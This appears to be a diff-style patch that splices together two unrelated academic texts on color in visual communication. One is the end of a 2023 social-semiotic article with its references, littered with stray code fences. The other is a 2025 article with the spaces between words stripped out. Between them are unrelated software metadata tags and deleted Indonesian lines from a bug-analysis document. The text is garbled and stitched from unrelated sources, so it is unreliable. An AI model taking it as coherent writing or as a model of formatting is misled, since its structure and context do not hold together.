+which can make the city be seen as more complex and desirable13. This is
+also supported by the fact that the same colors in the sky do not have the
+same effect, but an opposite one: The “natural” light of the city is not of
+interest, while the same light envelops the entire image of the elephant.
+Considering this hypothesis, we can interpret that the diadic
+harmony in the elephant image creates a relationship of similarity, since
+```
+13 We can point to a similar effect in the Street Fighter II game (Matumoto, 2022a).
+```
+```
+Both the Brazil stage (‘scenario’) and the US stage depict a waterfront location.
+```
+```
+However, color plays a key role in typifying (Barthes, 1973; 1977; Van Leeuwen,
+```
+```
+2001, p. 95) — i.e., using stereotypes to create types rather than individuals — the
+```
+people and architecture of Brazil, which are constructed as one and the same because
+both have a similar brown hue. The US stage, on the other hand, uses a variety of
+colors to individualize the people and separate them from the scenery. This creates a
+contrast between Brazil, an isolated and homogeneous space, and the US, an open and
+individualized, diverse space.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2060
+they are both natural participants, in contrast to the double complementary
+harmony in the city image, where the Blue and Cyan hues create a barrier
+between the city and the sky. This, in turn, is related to the discourses that
+envelop the stock images of “Europe” and “Africa”: While the former
+is an amalgam of many landscapes while maintaining its metropolitan
+character, Africa is exclusively a natural or ancient landscape.
+As we can see in this case study, colors provide multiple
+sources of meaning that can be analyzed individually or in combination.
+However, if we analyze a group of features, we can better determine
+which hypothesis the semiosis is most likely to point to. In addition,
+compositional resources can further enhance color analysis and vice versa.
+6 Conclusion
+In this paper, we have presented both analytical categories and
+methods for color analysis in digital media within a social-semiotic
+framework. Our theoretical contribution lies in the dialogue between
+the social-semiotic framework and color theory, through which we can
+analyze colors’ features as a truly quantitative resource, i.e., we can
+classify each feature into a comparative scale. Besides, we provide
+methods that allow reproducible results for color analysis. Among recent
+```
+works on color, we can cite Johannessen et al.’s (2021) “A Corpus-
+```
+Based Approach to Color, Shape, and Typography in Logos”, in which
+color analysis is based on Kress and van Leeuwen’s distinctive feature
+approach. The authors also demonstrate their approach using Adobe
+Photoshop, although a discussion of how to use that tool is not their
+primary focus. By discussing how to use the free and readily available
+tools presented here, we hope to have shown how the analysis can be
+supported by the use of some quantitative approaches that provide a more
+systematic description of colors and their meaning potential.
+As mentioned earlier, color presents a number of challenges
+for visual analysis. This is primarily because of how we interact with
+it. This means that designers need to understand both how color works
+and how audiences will interact with what they produce. Color is
+currently a sought-after resource outside of professional design as well:
+```
+from Instagram (www.instagram.com) to Canva (www.canva.com), non-
+```
+professionals are learning how to work with color in digital media, from
+photos to presentations.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2061
+Back to color deficiencies: Designers need to avoid color schemes
+that are difficult for some people to read. For example, according to Heron,
+```
+Crameri, and Shephard (2021), scientific images can be misleading or
+```
+inaccessible to some of the public because of the colors used, which are
+difficult for people with color deficiencies to read. This opens up the
+discussion of how meaningful colors are in different contexts and how
+we should pay attention to their use and analysis.
+The fact that people are increasingly interacting with color, and
+that this interaction is mediated by digital media, necessitates semiotic
+methods based on these practices and media. In this sense, this article
+offers an example and a call for color analysis based on digital corpora
+and methods. In this regard, there are a number of other software besides
+```
+GIMP and ImageMagick that can support research (e.g., https://inkscape.
+```
+```
+org/), and as mentioned earlier, we have not discussed all the possibilities
+```
+of GIMP and ImageMagick. This means that social semiotics can be
+constantly revitalized and updated in line with its socially grounded
+approach to help semioticians understand the semiotic process and
+current trends.
+Authorship statement
+Both authors contributed extensively to all aspects of this article.
+André de Oliveira Matumoto was responsible for conceptualizing the
+study, conducting formal analysis, funding acquisition, performing
+investigations, developing the methodology, creating visualizations, and
+drafting the original manuscript. Paulo Roberto Gonçalves Segundo was
+responsible for conceptualization, funding acquisition, validating the
+findings, and reviewing and editing the manuscript.
+Acknowledgments
+```
+The research for this article was supported by FAPESP (Fundação de
+```
+```
+Amparo à Pesquisa do Estado de São Paulo), grant 2020/13090-1.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2062
+References
+```
+BATEMAN, J.; WILDFEUER, J.; HIIPPALA, T. Multimodality:
+```
+Foundations, Research and Analysis – A Problem-Oriented Introduction.
+```
+Berlin: De Gruyter Mouton, 2017.
+```
+```
+COLOUR vision deficiency (colour blindness). NHS, England, UK, 01
+```
+Apr. 2019. Available at: https://www.nhs.uk/conditions/colour-vision-
+deficiency/#:~:text=It’s%20a%20common%20problem%20that,to%20
+someone%20with%20normal%20vision. Visited on: 21 Jan. 2023.
+GIMP DOCUMENTATION TEAM. GIMP Documentation. GIMP.
+Available at: https://www.gimp.org/docs/. Visited on: 21 Jan. 2023.
+GIMP main page. GIMP, 2023. Available at: https://www.gimp.org/.
+Visited on: 21 Jan. 2023.
+HALLIDAY, M.A.K. Language as Social Semiotic. London: Arnold, 1978.
+```
+HERON, P.; CRAMERI, F.; SHEPHARD, G. How rainbow colour maps
+```
+can distort data and be misleading. The conversation, 06 Oct. 2021.
+Available at: https://theconversation.com/how-rainbow-colour-maps-
+can-distort-data-and-be-misleading-167159. Visited on: 21 Jan. 2023.
+```
+HODGE, R.; KRESS, G. Social Semiotics. Cambridge: Polity Press, 1988.
+```
+IMAGEMAGICK main page. ImageMagick Studio LLC, 2023. Available
+```
+at: https://imagemagick.org/index.php. Visited on: 21 Jan. 2023.
+```
+INKSCAPE main page. Inkscape, 2023. Available at: https://inkscape.org/.
+Visited on: 21 Jan. 2023.
+```
+JAKOBSON, R.; HALLE, M. Fundamentals of Language. Mouton: The
+```
+Hague, 1956.
+```
+JEWITT, C.; BEZEMER, J.; O’HALLORAN, K. Introducing
+```
+Multimodality. New York: Routledge, 2016.
+```
+JOHANNESSEN, C. M.; TVEDE, M. L.; BOESEN, K. C.; HIIPPALA, T.
+```
+A Corpus-Based Approach to Color, Shape, and Typography in Logos. In:
+```
+PFLAEGING, J.; WILDFEUER, J.; BATEMAN, J. A. (eds.). Empirical
+```
+Multimodality Research: Methods, Evaluations, Implications. Berlin/
+```
+Boston: De Gruyter, 2021. p. 159–185.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2063
+```
+JOHNSON, J.; KARPATHY, A.; FEI-FEI, L. Densecap: Fully
+```
+convolutional localization networks for dense captioning. In: IEEE
+```
+Conference on Computer Vision and Pattern Recognition (CVPR), 2016,
+```
+Las Vegas, US. Proceedings […]. Las Vegas, USA: IEEE, p. 4565-4574,
+```
+DOI: https://doi.org/10.1109/CVPR.2016.494.
+```
+```
+JUNCTIONS (username). Optical grey squares orange brown. Wikimedia
+```
+Commons, 10 Apr. 2007. Available at: https://commons.wikimedia.org/wiki/
+```
+File:Optical_grey_squares_orange_brown.svg. Visited on: 21 Jan. 2023.
+```
+KANDINSKY, W. Concerning the Spiritual in Art. New York: Dover
+Publications, 1977.
+```
+KARPATHY, A.; FEI-FEI, L. Deep visual-semantic alignments for
+```
+generating image descriptions. In: IEEE Conference on Computer Vision
+```
+and Pattern Recognition (CVPR), 2015, Boston, USA. Proceedings […].
+```
+Boston, US: IEEE, p. 3128-3137, DOI: 10.1109/CVPR.2015.7298932.
+KINGDON Jonathan. The Kingdon Field Guide to African Mammals.
+Academic Press: San Diego, California, 1997.
+```
+KRESS, G.; VAN LEEUWEN, T. Colour as a semiotic mode: notes for a
+```
+grammar of colour. Visual communication, [S.l], v. 1, n. 3, p. 343-368, 2002.
+```
+DOI: https://doi.org/10.1177/147035720200100306. Available at: https://
+```
+www.researchgate.net/publication/237623450_Colour_as_a_Semiotic_
+Mode_Notes_for_a_Grammar_of_Colour. Visited on: 21 Jan. 2023.
+```
+KRESS, G.; VAN LEEUWEN, T. Reading Images. Geelong, Australia:
+```
+Deakin University Press, 1990.
+```
+KRESS, G.; VAN LEEUWEN, T. Reading Images: The Grammar of
+```
+visual design. 1 ed. London/ New York: Routledge, 1996.
+```
+KRESS, G.; VAN LEEUWEN, T. Reading Images: The Grammar of
+```
+Visual Design. 2 ed. London/ New York: Routledge, 2006.
+```
+KRESS, G.; VAN LEEUWEN, T. Reading Images: The Grammar of
+```
+Visual Design. 3 ed. London/ New York: Routledge, 2021.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2064
+MATUMOTO, A. de O. A construção brasilidade em Street Fighter II:
+```
+uma perspectiva sociossemiótica. In: GONÇALVES-SEGUNDO, P. R.;
+```
+```
+ARAES, C. R.; CASTANHEIRA, C.; ISOLA-LANZONI, G.; SILVA, L.
+```
+P. da; MITSUNARI, N. A. S.; DOMINGUES, T. (eds.). Estudos do texto e
+do discurso: perspectivas contemporâneas. São Paulo, SP: FFLCH/USP,
+2022a. p. 109–133. Available at: https://www.livrosabertos.sibi.usp.br/
+portaldelivrosUSP/catalog/book/935.
+MATUMOTO, A. de O. Sobrevoando a Amazônia: a construção verbo-
+imagética do Brasil em três jogos shmup. Entrepalavras, Fortaleza, v. 12,
+n. 3, p. 92–122, 2022b. DOI: https://doi.org/10.22168/2237-6321-32512.
+```
+MATUMOTO, A. de O.; GONÇALVES-SEGUNDO, P. R. Towards a
+```
+social-semiotic approach to visual analysis of two-dimensional games:
+a toolkit. Texto Livre, Belo Horizonte, vol. 15, no. 1, p. e39398, 2022a.
+```
+DOI: https://doi.org/10.35699/1983-3652.2022.39398.
+```
+```
+MATUMOTO, A. de O.; GONÇALVES-SEGUNDO, P. R. Uma Proposta
+```
+Sociossemiótica para a Análise Visual de Jogos Bidimensionais: a
+construção de significado em Ducktales. Entreletras, [S.l.], v. 13, n.
+1, p. 344–369, 2022b. DOI: https://doi.org/10.20873/uft2179-
+3948.2022v13n1p344-369.
+PAVLIDIS, G. A Brief History of Colour Theory: Foundations of Colour
+Science. Cham, CH: Springer International Publishing, 2021.
+POSSEBON, E. L. A teoria das cores de Goethe hoje. 2009. 168 f.
+Doutorado em Design e Arquitetura – Universidade de São Paulo, São
+Paulo, 2009. DOI 10.11606/T.16.2009.tde-10052010-144639. Available
+```
+at: http://www.teses.usp.br/teses/disponiveis/16/16134/tde-10052010-
+```
+144639/. Accessed on: 13 Jul. 2023.
+PSIKYO. Strikers 1945 II. Kyoto, Japan: Psikyo, 1997.
+RHYNE, T.-M. Applying color theory to digital media and visualization.
+Boca Raton: CRC Press, Taylor &Francis Group, 2017.
+```
+SARAVANAN, G.; YAMUNA, G.; NANDHINI, S. Real time
+```
+implementation of RGB to HSV/HSI/HSL and its reverse color space
+models. In: International Conference on Communication and Signal
+```
+Processing (ICCSP), 2016, Melmaruvathur, India. Proceedings […]:
+```
+IEEE, p. 0462-0466, DOI: 10.1109/ICCSP.2016.7754179.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2065
+VAN LEEUWEN, T. Introducing Social Semiotics. London: Routledge, 2005.
+VAN LEEUWEN, T. The Language of Colour: An Introduction. London:
+Routledge, 2011.
+```
+Video System. Aero Fighters 2 (Sonic Wings 2). Kyoto, Japan: SNK, 1994.
+```
+Video System. Sonic Wings Special. Kyoto, Japan: Media Quest/Phoenix, 1996.
+VON GOETHE, J. W. Zur Farbenlehre. Tübingen, DE: Cotta, 1810.
+Available at: https://archive.org/details/gri_c00233125012873531.
+Accessed on: 13 Jul. 2023.
+VON GOETHE, J. W. Goethe’s theory of colours. trans. by Charles Lock
+Eastlake. London, UK: John Murray, 1840. Available at: https://archive.
+org/details/goethestheoryco01goetgoog. Accessed on: 13 Jul. 2023.
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd, vcs, api]
+
+### 📘 KNOWLEDGE: NEXUS_1436+MANUSCRIPT.MD
+
 > **VERSION**: v1 | **Last Updated**: 26/05/2026
 
 
-**Tipe Dokumen:** Predictive Failure Analysis  
-**Basis:** Source code review mendalam — setelah seluruh bug generasi pertama diselesaikan  
-**Metodologi:** Setiap bug diprediksi dari pola kode aktual, bukan spekulasi  
 
-> **Konteks:** Dokumen ini menjawab pertanyaan: *"Setelah semua bug R-01 s/d R-08 selesai, bug apa yang akan muncul selanjutnya?"*  
-> Semua temuan di sini berakar pada kode yang sudah ada — bukan fitur baru.
+LanS./MAA,25(1),1-6
+Copyright:©2025.Thisisanopen-accessarticledistributedunderthetermsoftheCreativeCommonsAttributionLicense.
+## (https://creativecommons.org/licenses/by/4.0/).
+## 352
+## 352
+MediterraneanArchaeologyandArchaeometry
+## 2025,25(1),1436
+## ISSN:2241-8121
+https://www.maajournal.com/
+ResearchArticle
+AStudyoftheRoleofColorinVisualCommunicationinthe
+DigitalPerspective
+HanluLyu*
+## 1
+PHDcandidate,ArtandConvergence,DaejinUniversity,Pocheon,Gyeonggi-do,11159,SouthKorea
+*CorrespondingAuthor:
+lyuhanlu1010@163.com
+Citation:Lyu,H.(2025).AStudyoftheRoleofColorinVisualCommunicationintheDigitalPerspective.Mediterranean
+ArchaeologyandArchaeometry,25(1),352-357.
+## ARTICLEINFO
+Received:07May2024
+Accepted:23May2024
+## ABSTRACT
+Colorindigitalvisualcommunicationnotonlyhasthefunctionofvisualattraction,butalsocanconvey
+richinformationandconnotationthroughitsuniqueemotionalproperties.Differentcolorscantrigger
+differentemotionalresponsesfromtheaudience,thuseffectivelyguidingtheaudience'svisualfocus
+andemotionalresonance.Therefore,weproposetostudytheroleofcolorinvisualcommunication
+underthedigitalperspective.First,webrieflydescribethedigitaltechnologyandvisual
+communicationtechnology,andconductabasicresearch.Basedonthis,theemotionaleffectsof
+differentcolorsinvisualcommunicationarecompared.Weanalyzetheroleofcolorinvisual
+communicationunderdigitalvisionfromfouraspects:emotionalcommunication,visualguidance,
+associativefunction,culture,andbranding,andcombinethemwiththerulesandcharacteristicsof
+digitalvisualcommunicationtopresentmorepossibilitiesandbringmoreimmersivevisualexperience
+totheaudience.
+Keywords:Digitalvisualfield;Colordifferentiation;Visualcommunication;Visualprocessing;
+Real-timedataacquisition;Digitizationtechnology.
+## INTRODUCTION
+Visualcommunicationisanimportantmeansofinformationdissemination,whichhasshownunprecedentedvitalityand
+potentialinthedigitalfieldofvision
+## [1]
+.Color,asoneoftheimportantelementsofvisualcommunication,hasbecomemoreand
+moreprominentinthedigitalfieldofvision,andisworthstudyingandexploringindepth
+## [2]
+.Inthedigitalfieldofvision,coloris
+nolongerjustavisualembellishment,buthasbecomeanimportantcarrierofinformationtransmissionandemotional
+expression
+## [3]
+.Throughtheuseofcolor,designerscanmoreaccuratelyconveyinformation,guidetheaudience'semotions,and
+realizetheeffectivedisseminationofinformation
+## [4]
+.Meanwhile,withthecontinuousprogressofdigitaltechnology,theuseof
+colorhasbecomemorediversifiedandflexible,providingmorepossibilitiesforvisualcommunication.Therefore,weproposeto
+studytheroleofcolorinvisualcommunicationinthedigitalfield.Fromtheperspectiveofcolorpsychology,colorcantrigger
+people'semotionalresonanceandstimulatetheiremotionsandreactions
+## [5]
+.Inthedigitalfieldofvision,designerscancreate
+differentatmospheresandsituationsthroughtheselectionandmatchingofcolors,thusaffectingtheaudience'spsychological
+stateandbehavioralresponses
+## [6]
+.Forexample,warmcolorscanbringpeopleawarmandcomfortablefeeling,whilecoolcolors
+maytriggercalmandrationalthinking
+## [7]
+.Therefore,invisualcommunication,therationaluseofcolorcanbemoreeffectivein
+conveyinginformationandrealizetheprecisepositioningofinformation
+## [8]
+.Inaddition,withtheaidofdigitaltechnology,the
+useofcolorandmulti-dimensionalfusioneffecthasalsobeengreatlyimproved,toacertainextent,simplifyingthecomplexityof
+colormanagement
+## [9]
+.Inaddition,thepopularityofdigitaltechnologyalsoprovidesmorepossibilitiesforcolorinnovation.
+Designerscancreatericherandmorediversecoloreffectsthroughdigitalmeans,injectingnewvitalityandcreativityintovisual
+communication
+## [10]
+.Italsohelpslearnersunderstandthevalueandmeaningofcolorininformationcommunication,and
+providesdesignerswithmorescientificandeffectivecolorapplicationmethodsandstrategies
+## [11]
+.Throughcontinuous
+explorationandpractice,thepowerofcolorcanbebroughtintofullplay,injectingnewimpetusandvitalityintothedevelopment
+ofvisualcommunication
+## [12]
+## .
+## 1DIGITALTECHNOLOGYANDVISUALCOMMUNICATIONTECHNOLOGY
+
+LyuH./MAA,25(1),352-357
+MediterraneanArchaeologyandArchaeometry,Vol.25,No1,(2025),pp.352-357
+## 353
+Digitizationtechnologyisatechnologythatconvertsvarioustypesofinformationintodigitalformforprocessing
+## [13]
+.This
+technologybreaksthroughthelimitationsoftraditionalinformationprocessingtoacertainextent,enablinginformationtobe
+transmitted,storedandprocessedwithunprecedentedspeedandprecision.Whetheritistext,images,soundorvideo,theycan
+allbeconvertedintodigitalsignalsthroughdigitizationtechnologytoachieveefficienttransmissionandsharing.Theadvantages
+ofthistechnologyareitsefficiency,convenienceandaccuracy
+## [14]
+.Digitizationtechnologyprovidespowerfulsupportfortheeasy
+acquisitionandtransmissionofinformation,whetheritisremotecommunicationacrossgeographicspaceorlarge-scaledata
+processingandanalysis
+## [15]
+.Atthesametime,digitizationtechnologyallowsforaccuratereproductionandpreservationof
+information,avoidingthelossanddistortionofinformationthatmayoccurintraditionalmethods
+## [16]
+## .
+Visualcommunicationtechnology,ontheotherhand,isaperfectcombinationofartandtechnology,whichgenerally
+conveysinformationtotheaudienceeffectivelythroughvisualsymbols,images,colorsandotherelements.Withitsuniquecharm,
+visualcommunicationtechnologyhasbecomeanimportantmeansofinformationdisseminationinmodernsociety
+## [17]
+.Byusing
+visualelementssuchasgraphics,textandcolors,andthroughclevercombinationandlayout,itcreatesattractiveandinfectious
+visualworks,thusattractingtheaudience'sattentionandguidingthemtounderstandandaccepttheinformationconveyed
+## [18]
+## .
+## Atthesametime,visualcommunicationtechnologyisalsothekeytobrandingandpromotion
+## [19]
+.Throughuniquedesignstyles
+andvisualelements,visualcommunicationtechnologycanhelpbrandsestablishauniqueimageandenhancebrandawareness
+andreputation
+## [20]
+.Whetheritislogodesign,productpackaging,oradvertisingposters,brochures,etc.,visualcommunication
+technologyisindispensable
+## [21]
+## .
+## 2THEEMOTIONALEFFECTSOFDIFFERENTCOLORSFORVISUALCOMMUNICATION
+Asakindofnon-verbalexpression,colorhasadirectandstrongemotionaleffect.Differentcolorscantriggerdifferent
+emotionalresponsesandconveydifferentinformationandemotions.Thefollowingisadetailedanalysisoftheemotionaleffects
+ofseveralcommoncolorsinvisualcommunication
+## [22]
+## .
+(1)Redisavibrantandpassionatecolorwithstrongvisualimpact
+## [23]
+.Invisualcommunication,redisoftenusedtoexpress
+passion,love,courage,strengthandotheremotions.Forexample,inadvertisements,thecolorredisoftenusedtohighlightthe
+passionandvitalityofaproductorservicetoattractconsumers'attention.Atthesametime,redcanalsoinspirepeople'sfighting
+spiritanddetermination,soinsomesportsorathleticoccasions,redisalsooftenusedasthethemecolor
+## [24]
+.However,itis
+worthnotingthatinsomespecificaspects,thecolorredcanalsoformacertainnegativeimpact,producingsomenegative
+emotionaleffects,suchastension,angerorasenseofdanger.Therefore,theuseofredcolorinvisualcommunicationshouldbe
+carefullyselectedaccordingtothespecificcontextandcharacteristicsofthetargetaudience
+## [25]
+## .
+(2)Blueisacalm,rationalandtrustingcolor.Invisualcommunication,blueisoftenusedtoexpressprofessional,reliable
+andstableemotions.Forexample,infinance,scienceandtechnology,blueisoftenusedasthemaincolortoconveya
+professional,rigorousbrandimage.Bluecanalsocreateaquiet,calmatmosphere,helprelievetension,enhancepeople'ssenseof
+trust.Atthesametime.Differentlevelsofbluemaysometimesgivepeopleadifferentfeeling,suchaslightbluebright,darkblue
+melancholy,inkindifferent.Sointheuseofblue,needtopayattentiontograspthebrightnessofthecolorandsaturation,in
+ordertoavoidnegativeemotionaleffects.
+(3)Yellowisabright,warmandhappycolor.Invisualcommunication,yellowisoftenusedtoexpressenergy,sunshine,
+warmthandotheremotions.Intheadvertisementsofchildren'sproductsorhouseholdproducts,yellowisoftenusedasthemain
+colortocreateacheerfulandrelaxingatmosphere.Atthesametime,yellowalsohasahighdegreeofrecognition,canquickly
+attractpeople'sattention.Butthetransitionoftheyellowcolorcanalsoformaharshortoonoisyeffect.Therefore,whenused,
+accordingtothedesignneedsandthecharacteristicsofthetargetaudiencetomakemoderateadjustments.
+(4)Greenrepresentsthecolorofnature,healthandpeace.Invisualcommunication,greenisoftenusedtoexpress
+environmentalprotection,health,safetyandotheremotions.Inthepublicityofenvironmentalprotectionproducts,greenisoften
+usedasthemaincolortoemphasizetheenvironmentalcharacteristicsoftheproduct.Thiscolorcanalsocreateafresh,natural
+atmosphere,whichhelpstoenhancepeople'ssenseofcomfortandrelaxation.
+Invisualcommunication,designersneedtoselecttheappropriatecoloraccordingtothedesignneedsandthecharacteristics
+ofthetargetaudiencetomatchanduse,inordertoconveyspecificinformationandemotions,in-depthunderstandingofthe
+characteristicsofvariouscolorsandemotionaleffects,andcombinedwiththespecificdesignneedsandthecharacteristicsofthe
+targetaudienceforflexibleuse.
+## 3ANALYSISOFTHEROLEOFCOLORINVISUALCOMMUNICATIONINTHEDIGITALPERSPECTIVE,
+3.1Emotionalcommunication
+Themulti-dimensionalintegrationofcolormakesvisualcommunicationmorerichanddiversified.Asoneofthecore
+elementsofvisualcommunication,intermsofemotionalcommunication,color,withitsuniquecharmandpower,bringsthe
+audienceaprofoundemotionalexperience.Firstly,digitaltechnologymakestheuseofcolorinvisualcommunicationmore
+accurateandflexible.SeeFigure1fordetails.
+
+LyuH./MAA,25(1),352-357
+MediterraneanArchaeologyandArchaeometry,Vol.25,No1,(2025),pp.352-357
+## 354
+Fig.1Illustrationofthecontentofcolor-emotioncommunicationinvisualcommunication
+Figure1ismainlyaboutthesettingandanalysisofthecontentofcoloremotioncommunicationinvisualcommunication.
+Basedonthis,throughdigitaltools,designerscanaccuratelyadjustthebrightness,saturationandhueofcolorstocreatearich
+varietyofcoloreffects.Thisprecisionmakesthecolorcanbebettercombinedwiththevisualcontenttoformamoreharmonious
+visualexperience,whichfurtherdeepensthedepthandbreadthofemotionalcommunication.Secondly,colorhasadirect
+emotionalmappingeffectindigitalvisualcommunication.Eachcolorhasuniqueemotionalsymbolsandculturalconnotations,
+whichcantriggertheaudience'sspecificemotionalresponse.Forexample,redoftensymbolizespassion,vitalityandcourage,
+whichcanstimulatetheaudience'senthusiasmandpositiveemotions;bluerepresentscalmness,rationalityandtrust,whichcan
+createastableandprofessionalatmosphere.Indigitalvisualcommunication,designerscanchoosetherightcolortoconveya
+specificemotionalmessage,triggeringtheaudience'sempathyandrecognition.
+Inaddition,thecolorandemotioncommunicationinthedigitalfieldofvisionalsohasastrongerinteractivityand
+personalization.Accordingtotheaudience'sbehaviorandfeedback,theuseofcolorandcollocationcanbeadjustedinrealtime,
+whichmakesthevisualcommunicationworksmoreinlinewiththeaudience'spreferencesandneeds.Strongerinteractivitynot
+onlyenhancestheaudience'ssenseofparticipationandimmersioninthework,butalsomakestheemotionalcommunication
+moreaccurateandeffective.Inaddition,thepersonalizeduseofcolorcanalsobetterhighlighttheuniquenessandcreativityof
+thework,whichfurtherenhancestheeffectofemotionalcommunication.Underthedigitalperspective,theemotional
+communicationofcolorisalsoreflectedincross-culturalandcross-disciplinarycommunication.Byskillfullyusingcolorsina
+diversifiedway,designersbreakthroughculturalandlinguisticbarriersinpractice,andeffectivelyconveyemotionsand
+messagestoaudiencesofdifferentbackgrounds.However,inGucheng,duetothediversityandcomplexityofdigitaltechnology,
+itisnecessarytoconstantlylearnandmasternewtechniquesandtoolsforusingcolor.Coupledwiththechangingandupgrading
+oftheaudience'saestheticneeds,itisnecessarytoconstantlyinnovateandtrynewwaysofcolormatchingandcombinationto
+bettermeettheaudience'semotionalneeds.
+3.2Visualguidance
+Colorindigitalvisualcommunicationcanbuildvisualhierarchythroughchangesinbrightnessandsaturation.Indigital
+design,thedifferenceinbrightnessandsaturationofdifferentcolorscanbeusedtocreateasharpcontrasteffect.Thiscontrast
+notonlymakestheboundariesbetweeninformationblocksclear,butalsoguidestheviewer'seyestoflowaccordingtothe
+designer'sintention.Specificformsofguidanceinthefigureillustrates.
+Fig.2Diagrammaticrepresentationofcoloringuidingformsinvisualcommunication
+Figure2ismainlyananalysisofthedesignandpracticeofcolorguidanceinvisualcommunication.Forexample,inweb
+design,byadjustingthebrightnessandsaturationofdifferentinformationblocks,importantinformationcanbemademore
+prominentandattractusers'attention;colorscanalsoguidetheaudience'ssightthroughthecontrastofwarmandcoldcolors.In
+digitalvisualcommunication,theuseofwarmandcoolcolorsiscrucialforcreatinganatmosphereandguidingthevisualflow.
+Coolcolorsusuallygivepeopleasenseofpeaceandcalm,whilewarmcolorscanstimulatepeople'senthusiasmandvitality.
+Throughtheclevercombinationofwarmandcoolcolors,avisualflowiscreatedtoguidetheaudiencetobrowsetheinformation
+inacertaindirection.Thisvisualguidancenotonlymakestheinformationconveyedmorenaturallyandsmoothly,butalso
+enhancestheaudience'sreadingexperience;thecolorvisualguidanceinthedigitalfieldofvisionisalsoreflectedinthesenseof
+rhythmandrhymeofcolor.Designerscreatevisualeffectswithrhythmandrhymethroughgradation,repetitionandcontrastof
+colors.Thevisualeffectcannotonlyattracttheaudience'sattention,butalsoguidethemtoreceiveinformationinacertain
+rhythmandorder.Forexample,inanimationdesign,throughthegradationandtransformationofcolors,itcancreateadynamic
+visualeffectandguidetheaudiencetofollowtherhythmandchangeoftheanimation.
+Infact,theintegrationandguidanceofdigitaltechnology,toacertainextent,providesmorepossibilitiesforthevisual
+guidanceofcolorinvisualcommunication.Withtheaidandsupportofdigitaltoolsandtechnologies,designerscanprecisely
+controlthechangeandapplicationofcolortoachievemorecomplexanddetailedvisualguidanceeffects.Forexample:theuseof
+
+LyuH./MAA,25(1),352-357
+MediterraneanArchaeologyandArchaeometry,Vol.25,No1,(2025),pp.352-357
+## 355
+digitalsoftwareinthecoloradjustmenttools,designerscanmakeprecisemodificationsandadjustmentstothecolorintheimage,
+sothattheuseofcolorismoreinlinewiththeneedsandgoalsofthedesign.Atthattime,thisalsorequiresdesignerstohavea
+solidfoundationincolortheoryandrichpracticalexperience,accordingtothedesignneedsandthecharacteristicsofthetarget
+audienceforflexibleuse.Atthesametime,designersalsoneedtoconstantlylearnandexplorenewwaysofusingcolorand
+techniquestoadapttotheever-changingdigitalenvironmentandaudienceneeds.
+3.3Associativefunctions
+Colorindigitalvisualcommunicationcantriggertheaudience'sassociationwithspecificthings.Eachcolorhasaunique
+symbolicmeaningandculturalconnotation,andcanbeassociatedwithspecificthingsorscenes.Forexample,whenpeoplesee
+green,theytendtoassociateitwithnature,vitalityandpeace;whentheyseeblue,theytendtoassociateitwithocean,skyand
+calmness.Indigitalvisualcommunication,theuseofthesecolorssymbolism,andspecificthingsorscenescombinedtotrigger
+theaudience'sassociations,therebyenhancingthecommunicationeffectoftheinformation;colorcanalsotriggertheaudience's
+emotionsandemotionalassociations.Differentcolorscanevokedifferentemotionalresponses,butalsoguidetheaudienceto
+formdifferentfacethinking.Forexample,redislikefire,blueislikewater,andgreenislikevitality.Indigitalvisual
+communication,designersusetheemotionalcharacteristicsofcolortocreateaspecificemotionalatmosphere,triggeringthe
+audience'sempathyandfeelings.Thisemotionalassociationnotonlyenhancesthecommunicationeffectofinformation,butalso
+makesthevisualcommunicationworksmoreinfectiousandattractive.
+Inaddition,theassociationfunctionofcolorindigitalvisualcommunicationisalsoreflectedintheassociationofcultureand
+history.Asakindofculturalsymbol,itcarriesrichhistoricalandculturalconnotations,andthroughtheuseofcolorswith
+specificculturalsignificance,ittriggerstheaudience'sassociationwithcultureandhistory,andconveysspecificcultural
+informationandvalues.Thecurrentsettingcorrespondstothecontentoftheassociationguide,seetable1toillustrate.
+Table1Tableofassociativecontentsettingsofcolorindigitalvisualcommunication
+## Colorassociatescontentnamesindigitalvisual
+communication
+## Contentstandards
+ColorblocksplicingAdjustmentofdifferentcolorblocks
+VisualoverlapColorcausesvisualoverlap
+## Digitaladjustment
+## Combiningdigitaltechnologyforunbalanced
+adjustment
+DynamicpresentationVisualization+Dynamization
+Figure1ismainlyaboutthesettingoftheassociationcontentofcolorindigitalvisualcommunication.Thecurrent
+associationstandardandcontentarenotfixed,butcanbeadjustedaccordingtotheactualneeds.Thiskindofculturalassociation
+notonlyenrichesthecontentofvisualcommunication,butalsoenhancestheculturalconnotationanddepthofthework.
+Coupledwithdigitaltoolsandtechnologies,designerscancontroltheuseandpresentationofcolormoreprecisely,makingthe
+colorassociationeffectmoreprominentandstrong.Inaddition,digitaltechnologycanalsorealizedynamicchangesand
+interactiveeffectsofcolor,furtherenrichingtheassociativelevelandconnotationofcolor.Inthiscontext,designersalsoput
+forwardhigherrequirements,needtobemorefamiliarwiththecharacteristicsandsymbolismofvariouscolors,familiarwith
+colorandthings,emotions,cultureandotheraspectsoftheconnection.Flexibleuseofcolor,tocreateauniqueassociationeffect
+ofvisualcommunicationworks.
+3.4Culture,brandbuilding
+Asanimportantcarrierofculture,differentcolorsoftenhavespecificsymbolicmeaningandculturalconnotationindifferent
+culturalbackgrounds.Invisualcommunication,designerschoosespecificcolorstoconveyspecificculturalinformationand
+values.Forexample,inChineseculture,redrepresentsfestivity,auspiciousnessandprosperity,sointhevisualcommunicationof
+Chinesebrands,redisoftenusedasthemaincolortoexpressthefestiveatmosphereandculturalheritageofthebrand.In
+westernculture,blueisoftenregardedasasymbolofstability,professionalismandtrustworthiness,sointhevisual
+communicationofinternationalbrands,blueisoftenusedtoconveytheprofessionalismandreliabilityofthebrand;colorplaysa
+crucialroleinbranding.Theshapingofbrandimageneedstorelyonthepowerofvisualcommunication,andcolor,asan
+importantelementofvisualcommunication,candirectlyaffectpeople'sperceptionandfeelingofthebrand.Bychoosingtheright
+color,wecancreateauniquebrandimageandmakethebrandstandoutinthefiercemarketcompetition.Forexample,
+Coca-Cola'sredandwhitecombinationhasbecomeitsbrand'ssignaturecolor,whichnotonlyallowspeopletorecognize
